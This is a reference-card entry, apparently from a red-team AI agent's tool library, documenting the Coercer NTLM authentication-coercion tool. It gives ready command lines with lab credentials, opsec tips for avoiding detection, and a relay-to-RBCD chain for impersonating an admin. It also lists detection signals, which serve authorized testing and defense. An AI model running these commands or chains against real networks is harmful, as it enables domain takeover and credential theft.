---
name: Coercer
category: coercion-relay
subcategories: [authentication-coercion, ntlm-relay, multi-protocol]
tradecraft_tags: [coercion, ntlm-relay, rbcd, unconstrained-delegation, petitpotam, printerbug]
mitre_attack:
  - id: T1187
    name: Forced Authentication
source:
  url: https://github.com/p0dalirius/Coercer
  license: GPL-3.0
  maintained: true
binary_type: python-script
binary_filename: coercer.py
supported_os: [linux, windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Each coercion method Coercer uses (MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-FSRVP, etc.)
  generates SMB/RPC calls that are logged on the target if Windows SACL auditing is
  enabled. The NTLM auth that comes back to the relay listener shows in authentication
  logs on both the relay host and the DC. Coercer's automatic scanning mode generates
  many rapid probe packets — easily detected by network monitoring. Most modern MDI
  and EDR deployments flag unusual RPC calls from non-system processes.
usage_examples:
  - description: Coerce authentication from target to attacker's listener
    args: "coerce -u jon.snow -p Password123 -d north.sevenkingdoms.local -l 192.168.56.100 -t 192.168.56.10"
  - description: Scan which coercion methods are available on target (no actual coercion)
    args: "scan -u jon.snow -p Password123 -d north.sevenkingdoms.local -t 192.168.56.10"
  - description: Use specific protocol only (MS-EFSRPC / PetitPotam)
    args: "coerce -u jon.snow -p Password123 -d north.sevenkingdoms.local -l 192.168.56.100 -t 192.168.56.10 --filter-protocol-name MS-EFSRPC"
  - description: Coerce with NTLM hash instead of password
    args: "coerce -u jon.snow -H :nthash -d north.sevenkingdoms.local -l 192.168.56.100 -t 192.168.56.10"
opsec_notes: |
  Coercer is a Python tool — not directly runnable on Windows targets. In an Apollo-only
  engagement, coercion is typically done from the attacker's Linux system while the relay
  infrastructure is set up separately (ntlmrelayx, Responder). Coercer's scan mode is
  noisy (many RPC probes); use it only in lab or when detection is already expected.
  Single-method coercion (--filter-protocol-name) is quieter than the shotgun approach.
  MS-EFSRPC (PetitPotam) to DCs is partially patched (auth-required path); prefer
  non-DC targets or use the non-auth variant where applicable.
gotchas: |
  Coercer is a Python tool (not a .NET assembly) — Apollo cannot execute it directly.
  It must be run from the attacker's infrastructure (Linux box or Windows with Python).
  The relay listener (ntlmrelayx with --delegate-access for RBCD, or with LDAP signing
  checks) must be set up BEFORE triggering coercion. NTLM relay to LDAP requires LDAP
  signing to be disabled (not enforced by default on older Windows Server). For the RBCD
  relay path specifically, see KrbRelay for a Windows-side-only variant that doesn't
  require external listener infrastructure.
related_ttps: [petitpotam, spoolsample, dfscoerce, shadowcoerce, krbrelay, sharpkrbrelay]
alternatives: [petitpotam, spoolsample, dfscoerce, responder]
common_args:
  coerce:
    description: Sub-command to trigger coercion (try all available methods)
    typical_values: [flag-only]
    required: true
  scan:
    description: Sub-command to probe which coercion methods are available without triggering
    typical_values: [flag-only]
  -u:
    name: --username
    description: Domain username for authentication
    typical_values: ["jon.snow", "attacker"]
    required: true
  -p:
    name: --password
    description: Password for authentication
    typical_values: ["Password123"]
  -H:
    name: --hashes
    description: NTLM hash (LM:NT format) for authentication
    typical_values: [":nthash"]
  -d:
    name: --domain
    description: Target domain FQDN
    typical_values: ["north.sevenkingdoms.local"]
    required: true
  -l:
    name: --listener
    description: Attacker listener IP (where coerced auth will go)
    typical_values: ["192.168.56.100"]
    required: true
  -t:
    name: --target
    description: Target machine to coerce authentication from
    typical_values: ["192.168.56.10", "WINTERFELL.north.sevenkingdoms.local"]
    required: true
  --filter-protocol-name:
    description: Limit coercion to one specific protocol
    typical_values: ["MS-EFSRPC", "MS-RPRN", "MS-DFSNM", "MS-FSRVP"]
last_updated: 2026-05-29
---

# Coercer

Multi-protocol authentication coercion tool by p0dalirius. Coercer automates all known
Windows authentication coercion techniques (PetitPotam/MS-EFSRPC, PrintSpooler/MS-RPRN,
DFSCoerce/MS-DFSNM, ShadowCoerce/MS-FSRVP, and many more) into a single interface.
When triggered against a target, the target machine authenticates to the attacker's
listener via NTLM — enabling NTLM relay to LDAP (RBCD, shadow credentials), SMB relay
(file access, remote exec), or capture for hash cracking.

## Typical use cases
- Coerce a machine account's NTLM authentication for NTLM relay to LDAP (RBCD setup)
- Scan a target to determine which coercion methods are available before choosing one
- Coerce DC authentication to unconstrained delegation machine (ticket capture)
- Force authentication from a target server that has useful privileges

## How Sage uses this
Coercer is infrastructure-side (attacker box, Python) — it's used to set up the coercion
trigger while the relay listener and RBCD infrastructure are configured. For Apollo-based
Windows-side-only attacks, KrbRelay / SharpKrbRelay are the equivalents. Sage documents
Coercer for completeness in the NTLM relay + RBCD chain planning.

The typical chain Sage would describe:
1. Set up ntlmrelayx `--delegate-access` on attacker box
2. Run Coercer to trigger coercion from TARGET$ to listener
3. ntlmrelayx writes RBCD for attacker machine account on TARGET$
4. Rubeus S4U chain to impersonate admin

## Output
Console output listing which coercion methods were attempted and their results:
- `[+] (MS-EFSRPC) Coerced <IP> via EfsRpcOpenFileRaw!` — successful trigger
- `[-] ...` — method failed or patched

## Apollo-specific note
Coercer is a Python script — Apollo cannot run it directly. This tool runs on the
attacker's infrastructure (Linux/Windows with Python). For Windows-side Kerberos relay
without external infrastructure, see KrbRelay and SharpKrbRelay.

## Full Reference

> Captured against Coercer v2.4.x, 2026-05-29. Source: https://github.com/p0dalirius/Coercer README.

### Supported coercion protocols (as of v2.4)

| Protocol | Method | Auth-required path | Notes |
|----------|--------|--------------------|-------|
| MS-EFSRPC | EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv | Partial patch on DCs | PetitPotam |
| MS-RPRN | RpcRemoteFindFirstPrinterChangeNotification | Print Spooler must be running | PrintBug |
| MS-DFSNM | NetrDfsAddStdRoot | DFS namespace management | DFSCoerce |
| MS-FSRVP | IsPathShadowCopied / IsPathSupported | Shadow copy protocol | ShadowCoerce |
| MS-EVEN6 | OpenEventLog | Event log | — |
| MS-ICPR | CertServerRequest | ADCS web enrollment endpoint | ESC8 relay |
| MS-TSCH | SchRpcEnum | Task Scheduler | — |
| … and more | — | — | `coercer list` shows all |

### Sub-command argument listing — coerce

| Arg | Description |
|-----|-------------|
| `-t / --target X` | Target machine to coerce (IP or FQDN) |
| `-l / --listener X` | Listener IP (where auth is directed) |
| `-u / --username X` | Username for authentication |
| `-p / --password X` | Password |
| `-H / --hashes X` | NTLM hashes (LM:NT) |
| `-d / --domain X` | Domain FQDN |
| `--dc-ip X` | Domain controller IP |
| `--filter-protocol-name X` | Only use this protocol |
| `--filter-method-name X` | Only use this specific method |
| `--always-continue` | Continue after first successful coercion |
| `-v` | Verbose output |

### Source for this reference

- https://github.com/p0dalirius/Coercer (README)
- Version: v2.4.x as of 2026-05-29
